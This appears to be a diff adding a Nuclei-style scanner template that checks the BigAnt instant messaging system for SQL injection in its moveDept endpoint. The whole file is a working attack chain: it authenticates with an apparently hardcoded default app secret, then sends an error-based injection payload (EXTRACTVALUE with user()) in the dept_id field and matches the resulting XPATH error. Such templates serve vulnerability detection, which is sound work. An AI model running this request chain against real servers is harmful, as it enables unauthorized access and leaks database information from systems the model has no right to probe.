@@ -1,0 +1,40 @@
+id: damayi-moveDept-sql
+
+info:
+  name: 大蚂蚁 (BigAnt) 即时通讯系统 moveDept 存在SQL注入漏洞
+  author: damayi
+  severity: high
+  tags: damayi
+
+http:
+  - raw:
+      - |
+        POST /api/oauth/create_authen HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/x-www-form-urlencoded
+
+        uid=1&app_id=system&app_secret=www.upsoft01.com&ssid=CC1743B5-E5D5-42CE-B5F6-42E24464C8D0
+
+      - |
+        POST /api/dept/moveDept HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        authen={{authens}}&uid=1&dept_id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, user(), 0x7e)) AND 'a'='a&target_parentdept_id=123
+
+    extractors:
+      - type: regex
+        part: body
+        name: authens
+        regex:
+          - '"authen":"(.*?)"}'
+        internal: true
+        group: 1
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'XPATH syntax error'
+        condition: and
